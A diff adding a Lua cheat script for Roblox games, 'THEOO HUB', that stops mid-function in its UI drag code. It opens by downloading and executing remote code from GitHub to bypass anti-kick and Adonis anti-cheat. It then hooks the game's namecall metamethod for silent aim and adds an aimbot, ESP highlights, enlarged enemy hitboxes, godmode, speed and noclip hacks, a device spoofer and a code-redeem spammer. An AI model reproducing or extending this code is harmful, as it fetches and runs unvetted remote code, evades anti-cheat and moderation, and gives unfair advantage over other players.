@@ -1,0 +1,729 @@
+--[[
+  THEOO HUB — Palaiyot si Theoo Edition (Ultimate + Chams ESP + PANN Additions)
+  Features: Silent Aim, Aim Assist, Wall Check, Chams ESP, FPS Booster, Godmode, Spoofer, Hitbox, Aimbot, Cam Lock, Camera TP, TP Lock, Alkedion Redeemer
+]]
+
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+-- 1. ANTI-KICK & ADONIS BYPASS
+task.spawn(function()
+    pcall(function()
+        local url = "https://raw.githubusercontent.com/SUUUUUS00000/MEGGD-Anti-kick/refs/heads/main/MEGGD%20Best%20Anti-kick.lua"
+        local runner = loadstring(game:HttpGet(url))
+        if type(runner) == "function" then runner() end
+    end)
+end)
+task.spawn(function()
+    pcall(function()
+        local code = game:HttpGet("https://raw.githubusercontent.com/lovsirs/lovsirs5/refs/heads/main/AdonisBypass")
+        loadstring(code)()
+    end)
+end)
+
+local Players          = game:GetService("Players")
+local RunService       = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local Workspace        = game:GetService("Workspace")
+local CoreGui          = game:GetService("CoreGui")
+local TweenService     = game:GetService("TweenService")
+local Lighting         = game:GetService("Lighting")
+local ReplicatedStorage= game:GetService("ReplicatedStorage")
+local LocalPlayer      = Players.LocalPlayer
+local Camera           = Workspace.CurrentCamera
+
+-- 2. SPLASH
+local oldSplash = CoreGui:FindFirstChild("TheooSplash")
+if oldSplash then oldSplash:Destroy() end
+local SplashGui = Instance.new("ScreenGui", CoreGui)
+SplashGui.Name = "TheooSplash"; SplashGui.ResetOnSpawn = false; SplashGui.IgnoreGuiInset = true
+local SplashBg = Instance.new("Frame", SplashGui)
+SplashBg.Size = UDim2.new(1,0,1,0); SplashBg.BackgroundColor3 = Color3.fromRGB(10,10,15); SplashBg.BorderSizePixel = 0
+local SplashText = Instance.new("TextLabel", SplashBg)
+SplashText.Size = UDim2.new(1,0,0,60); SplashText.Position = UDim2.new(0,0,0.5,-30)
+SplashText.BackgroundTransparency = 1; SplashText.Text = "Palaiyot si Theoo"
+SplashText.TextColor3 = Color3.fromRGB(200,200,255); SplashText.Font = Enum.Font.GothamBlack; SplashText.TextSize = 32; SplashText.TextTransparency = 1
+TweenService:Create(SplashText, TweenInfo.new(0.5), {TextTransparency=0}):Play()
+task.delay(2.5, function()
+    TweenService:Create(SplashBg, TweenInfo.new(0.5), {BackgroundTransparency=1}):Play()
+    TweenService:Create(SplashText, TweenInfo.new(0.5), {TextTransparency=1}):Play()
+    task.wait(0.5); SplashGui:Destroy()
+end)
+
+-- 3. CONFIG & VARIABLES
+local Config = {
+    SilentAim = false, FovSize = 200, WallCheck = true,
+    AimAssist = false, AimAssistSmooth = 5,
+    Aimbot100 = false, MaxCamLock = false, TPCam = false, TPLock = false, CameraTP = false, TPCamSpeed = 140,
+    StretchRes = false, StretchValue = 0.65,
+    Godmode = false, Chams = false, FPSBoost = false, Minecraft = false,
+    Speed = false, SpeedValue = 100, InfJump = false,
+    Hitbox = false, HitboxSize = 20, RapidFire = false, Noclip = false
+}
+local SilentTarget = nil
+local GodmodeConns = {}
+local mcRestores = {}
+local SavedSettings = {}
+local PlayerChams = {}
+local tpCamConn = nil
+local tpCamRotation = CFrame.new()
+
+-- 4. TEAM CHECK (Strict)
+local function IsTeammate(TargetPlayer)
+    if not TargetPlayer or TargetPlayer == LocalPlayer then return true end
+    local LC = LocalPlayer.Character
+    local TC = TargetPlayer.Character
+    if LC and TC then
+        local LM, TM = LC:GetAttribute("MatchId"), TC:GetAttribute("MatchId")
+        if LM ~= nil or TM ~= nil then
+            local LT, TT = LC:GetAttribute("PvPTeam"), TC:GetAttribute("PvPTeam")
+            return LM ~= nil and LM == TM and LT ~= nil and TT ~= nil and LT == TT
+        end
+    end
+    local LS, TS = LocalPlayer:GetAttribute("StageTeamSide"), TargetPlayer:GetAttribute("StageTeamSide")
+    if typeof(LS) == "number" and typeof(TS) == "number" then return LS == TS end
+    if LocalPlayer.Neutral or TargetPlayer.Neutral then return false end
+    return LocalPlayer.Team ~= nil and TargetPlayer.Team == LocalPlayer.Team
+end
+
+-- 5. WALL CHECK FUNCTION
+local function IsVisible(targetPart)
+    if not targetPart then return false end
+    local origin = Camera.CFrame.Position
+    local direction = targetPart.Position - origin
+    local rayParams = RaycastParams.new()
+    rayParams.FilterType = Enum.RaycastFilterType.Exclude
+    rayParams.FilterDescendantsInstances = { LocalPlayer.Character, targetPart.Parent }
+    rayParams.IgnoreWater = true
+    local result = Workspace:Raycast(origin, direction, rayParams)
+    return result == nil
+end
+
+-- 6. TARGETING LOGIC
+local function GetTarget()
+    local center = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
+    local bestPart, bestScore = nil, math.huge
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and not IsTeammate(p) and p.Character then
+            local hum = p.Character:FindFirstChildOfClass("Humanoid")
+            local head = p.Character:FindFirstChild("Head")
+            if hum and hum.Health > 0 and head and not p.Character:FindFirstChildOfClass("ForceField") then
+                if Config.WallCheck and not IsVisible(head) then continue end
+                local scr, on = Camera:WorldToViewportPoint(head.Position)
+                if on and scr.Z > 0 then
+                    local dSq = (scr.X-center.X)^2 + (scr.Y-center.Y)^2
+                    if dSq <= Config.FovSize^2 and dSq < bestScore then
+                        bestScore = dSq; bestPart = head
+                    end
+                end
+            end
+        end
+    end
+    return bestPart
+end
+
+-- 7. SILENT AIM
+local oldNamecall
+oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
+    local method = getnamecallmethod()
+    if not checkcaller() and Config.SilentAim and SilentTarget then
+        if method == "Raycast" then
+            local args = {...}
+            if typeof(args[2]) == "Vector3" and args[2].Magnitude > 25 then
+                args[2] = (SilentTarget.Position - args[1]).Unit * args[2].Magnitude
+                return oldNamecall(self, unpack(args))
+            end
+        elseif method == "FindPartOnRay" or method == "FindPartOnRayWithIgnoreList" then
+            local args = {...}
+            if typeof(args[1]) == "Ray" and args[1].Direction.Magnitude > 25 then
+                args[1] = Ray.new(args[1].Origin, (SilentTarget.Position - args[1].Origin).Unit * args[1].Direction.Magnitude)
+                return oldNamecall(self, unpack(args))
+            end
+        elseif method == "FireServer" or method == "InvokeServer" then
+            local args = {...}
+            for i, v in pairs(args) do
+                if typeof(v) == "CFrame" and v.Position.Magnitude > 1 then
+                    args[i] = CFrame.lookAt(v.Position, SilentTarget.Position)
+                end
+            end
+            return oldNamecall(self, unpack(args))
+        end
+    end
+    return oldNamecall(self, ...)
+end)
+-- 8. RENDER LOOP (Aim Assist, 100% Aimbot, Max Cam Lock, TP Lock, Camera TP)
+UserInputService.InputChanged:Connect(function(input)
+    if Config.CameraTP and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and input.Delta then
+        tpCamRotation = tpCamRotation * CFrame.Angles(0, math.rad(-input.Delta.X * 0.4), 0) * CFrame.Angles(math.rad(-input.Delta.Y * 0.4), 0, 0)
+    end
+end)
+
+RunService.RenderStepped:Connect(function(dt)
+    if Config.SilentAim then SilentTarget = GetTarget() else SilentTarget = nil end
+    local targetPart = GetTarget()
+
+    -- Camera TP Logic
+    if Config.CameraTP then
+        Camera.CameraType = Enum.CameraType.Scriptable
+        if not tpCamConn then
+            tpCamConn = RunService.RenderStepped:Connect(function(d)
+                local c = Workspace.CurrentCamera
+                local move = Vector3.new(0,0,0)
+                if UserInputService:IsKeyDown(Enum.KeyCode.W) then move += tpCamRotation.LookVector end
+                if UserInputService:IsKeyDown(Enum.KeyCode.S) then move -= tpCamRotation.LookVector end
+                if UserInputService:IsKeyDown(Enum.KeyCode.A) then move -= tpCamRotation.RightVector end
+                if UserInputService:IsKeyDown(Enum.KeyCode.D) then move += tpCamRotation.RightVector end
+                
+                if move.Magnitude > 0 then c.CFrame = CFrame.new(c.CFrame.Position + move.Unit * Config.TPCamSpeed * d) * tpCamRotation else c.CFrame = CFrame.new(c.CFrame.Position) * tpCamRotation end
+            end)
+        end
+    else
+        if tpCamConn then tpCamConn:Disconnect(); tpCamConn = nil end
+        if Camera.CameraType == Enum.CameraType.Scriptable then
+            Camera.CameraType = Enum.CameraType.Custom
+            if LocalPlayer.Character then Camera.CameraSubject = LocalPlayer.Character:FindFirstChildOfClass("Humanoid") end
+        end
+    end
+
+    -- Aiming & Locking Logic
+    if targetPart and not Config.CameraTP then
+        if Config.AimAssist then
+            local smoothFactor = math.clamp(1 / Config.AimAssistSmooth, 0.01, 1)
+            local newCFrame = CFrame.lookAt(Camera.CFrame.Position, targetPart.Position)
+            Camera.CFrame = Camera.CFrame:Lerp(newCFrame, smoothFactor)
+        end
+        if Config.Aimbot100 then
+            Camera.CFrame = CFrame.lookAt(Camera.CFrame.Position, targetPart.Position)
+        end
+        if Config.MaxCamLock then
+            Camera.CFrame = CFrame.new(Camera.CFrame.Position, targetPart.Position)
+        end
+        if Config.TPLock then
+            local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                local targetPos = targetPart.Position - (Camera.CFrame.LookVector * 10)
+                hrp.CFrame = CFrame.new(targetPos, targetPart.Position)
+            end
+        end
+    end
+    
+    -- Update Hitboxes
+    if Config.Hitbox then UpdateHitboxes() end
+end)
+
+-- 9. FPS BOOSTER
+local function ToggleFPSBoost(state)
+    if state then
+        SavedSettings.GlobalShadows = Lighting.GlobalShadows
+        SavedSettings.FogEnd = Lighting.FogEnd
+        SavedSettings.Quality = settings().Rendering.QualityLevel
+        Lighting.GlobalShadows = false
+        Lighting.FogEnd = 9e9
+        Lighting.EnvironmentDiffuseScale = 0
+        Lighting.EnvironmentSpecularScale = 0
+        settings().Rendering.QualityLevel = Enum.RenderingQualityLevel.Level01
+        for _, obj in ipairs(Workspace:GetDescendants()) do
+            if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or obj:IsA("Fire") then
+                obj.Enabled = false
+            end
+        end
+    else
+        Lighting.GlobalShadows = SavedSettings.GlobalShadows
+        Lighting.FogEnd = SavedSettings.FogEnd
+        settings().Rendering.QualityLevel = SavedSettings.Quality
+        Lighting.EnvironmentDiffuseScale = 1
+        Lighting.EnvironmentSpecularScale = 1
+    end
+end
+
+-- 10. CHAMS ESP
+local function UpdateChams()
+    if not Config.Chams then
+        for _, hl in pairs(PlayerChams) do
+            if hl and hl.Parent then hl:Destroy() end
+        end
+        table.clear(PlayerChams)
+        return
+    end
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer and not IsTeammate(plr) and plr.Character then
+            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
+            if hum and hum.Health > 0 then
+                if not PlayerChams[plr] or not PlayerChams[plr].Parent then
+                    local hl = Instance.new("Highlight")
+                    hl.Name = "TheooChams"
+                    hl.FillColor = Color3.fromRGB(255, 60, 90)
+                    hl.FillTransparency = 0.4
+                    hl.OutlineColor = Color3.fromRGB(255, 255, 255)
+                    hl.OutlineTransparency = 0
+                    hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+                    hl.Adornee = plr.Character
+                    hl.Parent = plr.Character
+                    PlayerChams[plr] = hl
+                else
+                    PlayerChams[plr].Adornee = plr.Character
+                end
+            elseif PlayerChams[plr] then
+                PlayerChams[plr]:Destroy()
+                PlayerChams[plr] = nil
+            end
+        elseif PlayerChams[plr] then
+            PlayerChams[plr]:Destroy()
+            PlayerChams[plr] = nil
+        end
+    end
+end
+
+-- 11. GODMODE
+local function getRoot() return LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") end
+local function ToggleGodmode(state)
+    for _, conn in ipairs(GodmodeConns) do if conn then conn:Disconnect() end end
+    GodmodeConns = {}
+    if not state then return end
+    table.insert(GodmodeConns, RunService.Heartbeat:Connect(function()
+        local hrp = getRoot()
+        if not hrp then return end
+        hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(0.5), 0)
+        local old = hrp.Velocity
+        hrp.Velocity = Vector3.new(0, -16384, 0)
+        RunService.RenderStepped:Wait()
+        hrp.Velocity = old
+    end))
+    table.insert(GodmodeConns, RunService.Stepped:Connect(function()
+        task.wait(0.1)
+        local hrp = getRoot()
+        if not hrp then return end
+        local old = hrp.AssemblyLinearVelocity
+        hrp.AssemblyLinearVelocity = Vector3.new(math.random(-2000, 6000), math.random(-13000, 3000), math.random(-6000, 2000))
+        RunService.RenderStepped:Wait()
+        hrp.AssemblyLinearVelocity = old
+    end))
+end
+
+-- 12. HITBOX LOGIC
+local originalHitboxSizes = {}
+local function ResetHitboxes()
+    for _, other in ipairs(Players:GetPlayers()) do
+        if other ~= LocalPlayer and other.Character then
+            local hrp = other.Character:FindFirstChild("HumanoidRootPart")
+            if hrp and originalHitboxSizes[other] then
+                hrp.Size = originalHitboxSizes[other].size
+                hrp.Transparency = originalHitboxSizes[other].transparency
+                hrp.CanCollide = originalHitboxSizes[other].canCollide
+                originalHitboxSizes[other] = nil
+            end
+        end
+    end
+end
+
+function UpdateHitboxes()
+    for _, other in ipairs(Players:GetPlayers()) do
+        if other ~= LocalPlayer and other.Character then
+            local hrp = other.Character:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                if Config.Hitbox then
+                    if not originalHitboxSizes[other] then
+                        originalHitboxSizes[other] = { size = hrp.Size, transparency = hrp.Transparency, canCollide = hrp.CanCollide }
+                    end
+                    local s = Config.HitboxSize
+                    hrp.Size = Vector3.new(s, s, s)
+                    hrp.Transparency = 0.7
+                    hrp.CanCollide = false
+                elseif originalHitboxSizes[other] then
+                    hrp.Size = originalHitboxSizes[other].size
+                    hrp.Transparency = originalHitboxSizes[other].transparency
+                    hrp.CanCollide = originalHitboxSizes[other].canCollide
+                    originalHitboxSizes[other] = nil
+                end
+            end
+        end
+    end
+end
+
+-- 13. SPEED / INF JUMP / NOCLIP
+local defaultSpeed = 16
+local function ApplySpeed()
+    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+    if not hum then return end
+    hum.WalkSpeed = Config.Speed and Config.SpeedValue or defaultSpeed
+end
+
+RunService.Heartbeat:Connect(function()
+    if not Config.Speed then return end
+    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+    if hum and hum.WalkSpeed ~= Config.SpeedValue then
+        hum.WalkSpeed = Config.SpeedValue
+    end
+end)
+
+UserInputService.JumpRequest:Connect(function()
+    if not Config.InfJump then return end
+    local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+    if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
+end)
+
+local noclipConnection = nil
+local function ToggleNoclip(state)
+    if noclipConnection then noclipConnection:Disconnect(); noclipConnection = nil end
+    if not state then
+        local char = LocalPlayer.Character
+        if char then for _, part in ipairs(char:GetDescendants()) do if part:IsA("BasePart") then part.CanCollide = true end end end
+        return
+    end
+    noclipConnection = RunService.Stepped:Connect(function()
+        local char = LocalPlayer.Character
+        if not char then return end
+        for _, part in ipairs(char:GetDescendants()) do if part:IsA("BasePart") and part.CanCollide then part.CanCollide = false end end
+    end)
+end
+-- 14. DEVICE SPOOFER & MINECRAFT
+local function ToggleDeviceSpoofer(state)
+    if not state then return end
+    local remote = game:GetService("ReplicatedStorage"):WaitForChild("PVP_DeviceReport", 5)
+    if remote then
+        local old
+        old = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
+            if self == remote and getnamecallmethod() == "FireServer" and not checkcaller() then return old(self, "Computer") end
+            return old(self, ...)
+        end))
+        remote:FireServer("Computer")
+    end
+end
+
+local textures = { Slate="rbxassetid://8676746437", Grass="rbxassetid://9267183930", Sand="rbxassetid://12624140843", Wood="rbxassetid://3258599312", Brick="rbxassetid://10777285622", Concrete="rbxassetid://15622710576", CorrodedMetal="rbxassetid://7861269583", Metal="rbxassetid://12165061309", WoodPlanks="rbxassetid://8676581022" }
+local function ToggleMinecraft(state)
+    if state then
+        for _, obj in ipairs(Workspace:GetDescendants()) do
+            if obj:IsA("BasePart") and obj.Transparency < 0.8 and not mcRestores[obj] then
+                local tex = textures[obj.Material.Name]
+                if tex then
+                    mcRestores[obj] = {Color=obj.Color, Material=obj.Material}
+                    obj.Color = Color3.fromRGB(254,253,255); obj.Material = Enum.Material.SmoothPlastic
+                    local t = Instance.new("Texture", obj); t.Texture = tex; t.Face = Enum.NormalId.Top; t.StudsPerTileU = 6; t.StudsPerTileV = 6
+                end
+            end
+        end
+    else
+        for part, data in pairs(mcRestores) do
+            if part and part.Parent then
+                part.Color = data.Color; part.Material = data.Material
+                for _, c in ipairs(part:GetChildren()) do if c:IsA("Texture") then c:Destroy() end end
+            end
+        end
+        mcRestores = {}
+    end
+end
+
+-- 15. MODERN UI
+local Gui = Instance.new("ScreenGui", CoreGui)
+Gui.Name = "TheooJutFusion"; Gui.ResetOnSpawn = false
+
+local Main = Instance.new("Frame", Gui)
+Main.Size = UDim2.new(0, 500, 0, 340)
+Main.Position = UDim2.new(0.5, -250, 0.5, -170)
+Main.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
+Main.BorderSizePixel = 0
+Main.Active = true
+Main.Visible = false
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 12)
+
+local TopBar = Instance.new("Frame", Main)
+TopBar.Size = UDim2.new(1, 0, 0, 40)
+TopBar.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
+TopBar.BorderSizePixel = 0
+Instance.new("UICorner", TopBar).CornerRadius = UDim.new(0, 12)
+
+local Title = Instance.new("TextLabel", TopBar)
+Title.Size = UDim2.new(1, -100, 1, 0)
+Title.Position = UDim2.new(0, 20, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "Theoo x Jut Fusion"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 16
+Title.TextXAlignment = Enum.TextXAlignment.Left
+
+local CloseBtn = Instance.new("TextButton", TopBar)
+CloseBtn.Size = UDim2.new(0, 30, 0, 30)
+CloseBtn.Position = UDim2.new(1, -40, 0.5, -15)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+CloseBtn.Text = "X"
+CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseBtn.Font = Enum.Font.GothamBold
+Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 8)
+CloseBtn.Activated:Connect(function() Main.Visible = false end)
+
+local Sidebar = Instance.new("Frame", Main)
+Sidebar.Size = UDim2.new(0, 120, 1, -50)
+Sidebar.Position = UDim2.new(0, 10, 0, 45)
+Sidebar.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
+Sidebar.BorderSizePixel = 0
+Instance.new("UICorner", Sidebar).CornerRadius = UDim.new(0, 8)
+local TabList = Instance.new("UIListLayout", Sidebar)
+TabList.Padding = UDim.new(0, 5)
+TabList.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+local Content = Instance.new("Frame", Main)
+Content.Size = UDim2.new(1, -140, 1, -50)
+Content.Position = UDim2.new(0, 130, 0, 45)
+Content.BackgroundColor3 = Color3.fromRGB(20, 20, 26)
+Content.BorderSizePixel = 0
+Instance.new("UICorner", Content).CornerRadius = UDim.new(0, 8)
+
+local Pages = {}
+local function CreatePage(name)
+    local page = Instance.new("ScrollingFrame", Content)
+    page.Name = name
+    page.Size = UDim2.new(1, -10, 1, -10)
+    page.Position = UDim2.new(0, 5, 0, 5)
+    page.BackgroundTransparency = 1
+    page.ScrollBarThickness = 2
+    page.CanvasSize = UDim2.new(0, 0, 0, 0)
+    page.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    page.Visible = false
+    Instance.new("UIListLayout", page).Padding = UDim.new(0, 8)
+    Pages[name] = page
+    return page
+end
+
+local function CreateToggle(parent, text, default, callback)
+    local btn = Instance.new("TextButton", parent)
+    btn.Size = UDim2.new(1, 0, 0, 32)
+    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
+    btn.Text = ""
+    btn.AutoButtonColor = false
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+
+    local label = Instance.new("TextLabel", btn)
+    label.Size = UDim2.new(1, -60, 1, 0)
+    label.Position = UDim2.new(0, 12, 0, 0)
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.TextColor3 = Color3.fromRGB(200, 200, 210)
+    label.Font = Enum.Font.GothamMedium
+    label.TextSize = 13
+    label.TextXAlignment = Enum.TextXAlignment.Left
+
+    local track = Instance.new("Frame", btn)
+    track.Size = UDim2.new(0, 36, 0, 18)
+    track.Position = UDim2.new(1, -46, 0.5, -9)
+    track.BackgroundColor3 = default and Color3.fromRGB(255, 60, 90) or Color3.fromRGB(50, 50, 65)
+    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)
+
+    local knob = Instance.new("Frame", track)
+    knob.Size = UDim2.new(0, 14, 0, 14)
+    knob.Position = default and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
+    knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
+
+    local isOn = default
+    btn.MouseButton1Click:Connect(function()
+        isOn = not isOn
+        TweenService:Create(track, TweenInfo.new(0.2), {BackgroundColor3 = isOn and Color3.fromRGB(255, 60, 90) or Color3.fromRGB(50, 50, 65)}):Play()
+        TweenService:Create(knob, TweenInfo.new(0.2), {Position = isOn and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)}):Play()
+        callback(isOn)
+    end)
+end
+
+local function CreateSlider(parent, text, min, max, default, callback)
+    local frame = Instance.new("Frame", parent)
+    frame.Size = UDim2.new(1, 0, 0, 45)
+    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 6)
+
+    local label = Instance.new("TextLabel", frame)
+    label.Size = UDim2.new(0.7, 0, 0, 20)
+    label.Position = UDim2.new(0, 12, 0, 4)
+    label.BackgroundTransparency = 1
+    label.Text = text .. ": " .. default
+    label.TextColor3 = Color3.fromRGB(200, 200, 210)
+    label.Font = Enum.Font.GothamMedium
+    label.TextSize = 12
+    label.TextXAlignment = Enum.TextXAlignment.Left
+
+    local bar = Instance.new("Frame", frame)
+    bar.Size = UDim2.new(1, -24, 0, 4)
+    bar.Position = UDim2.new(0, 12, 1, -15)
+    bar.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
+    Instance.new("UICorner", bar).CornerRadius = UDim.new(1, 0)
+
+    local fill = Instance.new("Frame", bar)
+    fill.Size = UDim2.new((default-min)/(max-min), 0, 1, 0)
+    fill.BackgroundColor3 = Color3.fromRGB(255, 60, 90)
+    Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
+
+    local dragging = false
+    bar.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = true end
+    end)
+    UserInputService.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            local rel = math.clamp((input.Position.X - bar.AbsolutePosition.X) / bar.AbsoluteSize.X, 0, 1)
+            local val = math.floor(min + (max-min)*rel + 0.5)
+            fill.Size = UDim2.new(rel, 0, 1, 0)
+            label.Text = text .. ": " .. val
+            callback(val)
+        end
+    end)
+end
+
+local CombatPage = CreatePage("Combat")
+local VisualPage = CreatePage("Visual")
+local MiscPage = CreatePage("Misc")
+local TPPage = CreatePage("TP")
+local RedeemPage = CreatePage("Redeem")
+
+local function SelectTab(page, btn)
+    for _, p in pairs(Pages) do p.Visible = false end
+    page.Visible = true
+    for _, c in pairs(Sidebar:GetChildren()) do
+        if c:IsA("TextButton") then
+            c.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
+            c.TextColor3 = Color3.fromRGB(150, 150, 160)
+        end
+    end
+    btn.BackgroundColor3 = Color3.fromRGB(255, 60, 90)
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+end
+
+local function CreateTabButton(text, page)
+    local btn = Instance.new("TextButton", Sidebar)
+    btn.Size = UDim2.new(0.9, 0, 0, 30)
+    btn.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
+    btn.Text = text
+    btn.TextColor3 = Color3.fromRGB(150, 150, 160)
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 12
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+    btn.MouseButton1Click:Connect(function() SelectTab(page, btn) end)
+    return btn
+end
+
+local btnCombat = CreateTabButton("Combat", CombatPage)
+local btnVisual = CreateTabButton("Visual", VisualPage)
+local btnMisc = CreateTabButton("Misc", MiscPage)
+local btnTP = CreateTabButton("TP List", TPPage)
+local btnRedeem = CreateTabButton("Redeem", RedeemPage)
+SelectTab(CombatPage, btnCombat)
+
+-- UI FILLING
+CreateToggle(CombatPage, "Silent Aim", false, function(v) Config.SilentAim = v end)
+CreateToggle(CombatPage, "100% Aimbot", false, function(v) Config.Aimbot100 = v end)
+CreateToggle(CombatPage, "Max Cam Lock", false, function(v) Config.MaxCamLock = v end)
+CreateToggle(CombatPage, "Camera TP (Fly)", false, function(v) Config.CameraTP = v end)
+CreateToggle(CombatPage, "TP Lock (Follow)", false, function(v) Config.TPLock = v end)
+CreateToggle(CombatPage, "Aim Assist", false, function(v) Config.AimAssist = v end)
+CreateSlider(CombatPage, "Aim Smoothness", 1, 20, 5, function(v) Config.AimAssistSmooth = v end)
+CreateToggle(CombatPage, "Wall Check", true, function(v) Config.WallCheck = v end)
+CreateSlider(CombatPage, "FOV Size", 50, 500, 200, function(v) Config.FovSize = v end)
+CreateToggle(CombatPage, "Godmode", false, ToggleGodmode)
+CreateToggle(CombatPage, "Hitbox Expander", false, function(v) Config.Hitbox = v; if not v then ResetHitboxes() end end)
+CreateSlider(CombatPage, "Hitbox Size", 5, 50, 20, function(v) Config.HitboxSize = v end)
+
+CreateToggle(VisualPage, "Chams ESP", false, function(v) Config.Chams = v end)
+CreateToggle(VisualPage, "FPS Booster", false, ToggleFPSBoost)
+CreateToggle(VisualPage, "Minecraft Mode", false, ToggleMinecraft)
+
+CreateToggle(MiscPage, "Speed Hack", false, function(v) Config.Speed = v; ApplySpeed() end)
+CreateSlider(MiscPage, "Speed Value", 16, 500, 100, function(v) Config.SpeedValue = v; ApplySpeed() end)
+CreateToggle(MiscPage, "Infinite Jump", false, function(v) Config.InfJump = v end)
+CreateToggle(MiscPage, "Noclip", false, function(v) Config.Noclip = v; ToggleNoclip(v) end)
+CreateToggle(MiscPage, "Device Spoofer (PC)", false, ToggleDeviceSpoofer)
+
+-- 16. TP TO PLAYER LOGIC
+local function RefreshTPList()
+    for _, v in ipairs(TPPage:GetChildren()) do
+        if v:IsA("TextButton") and v.Name ~= "" then v:Destroy() end
+    end
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer then
+            local btn = Instance.new("TextButton", TPPage)
+            btn.Size = UDim2.new(1, 0, 0, 30)
+            btn.BackgroundColor3 = Color3.fromRGB(40, 120, 70)
+            btn.Text = "TP to " .. plr.Name
+            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+            btn.Font = Enum.Font.GothamBold
+            btn.TextSize = 12
+            Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+            btn.MouseButton1Click:Connect(function()
+                if plr.Character and LocalPlayer.Character then
+                    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                    local targetHrp = plr.Character:FindFirstChild("HumanoidRootPart")
+                    if hrp and targetHrp then
+                        hrp.CFrame = targetHrp.CFrame * CFrame.new(0, 0, 5)
+                    end
+                end
+            end)
+        end
+    end
+end
+RefreshTPList()
+Players.PlayerAdded:Connect(RefreshTPList)
+Players.PlayerRemoving:Connect(function() task.wait(0.5); RefreshTPList() end)
+
+-- 17. ALKEDION REDEEMER
+local redeemBtn = Instance.new("TextButton", RedeemPage)
+redeemBtn.Size = UDim2.new(1, 0, 0, 40)
+redeemBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+redeemBtn.Text = "REDEEM ALL ALKEDION CODES"
+redeemBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+redeemBtn.Font = Enum.Font.GothamBold
+redeemBtn.TextSize = 14
+Instance.new("UICorner", redeemBtn).CornerRadius = UDim.new(0, 6)
+
+redeemBtn.MouseButton1Click:Connect(function()
+    local event = game:GetService("ReplicatedStorage"):WaitForChild("CodeRedeemCommand")
+    local codes = {
+        "wJeyd", "Sakura", "Mummy",
+        "Laser", "Strkd", "Six7",
+        "Wrdn", "mrq2", "UNF", "Elf", "Rose",
+        "evg", "spirit", "Skragon",
+        "DB", "wulse",
+        "Gscythe", "Grasper", "Eclipsion", "Voidbane"
+    }
+    for _, code in ipairs(codes) do
+        event:FireServer("/code " .. code)
+        task.wait(4.5)
+    end
+end)
+
+-- 18. DRAG & ICON
+local dragging, dragInput, dragStart, startPos
+TopBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true; dragStart = input.Position; startPos = Main.Position
+    end
+end)
+TopBar.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then dragInput = input end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
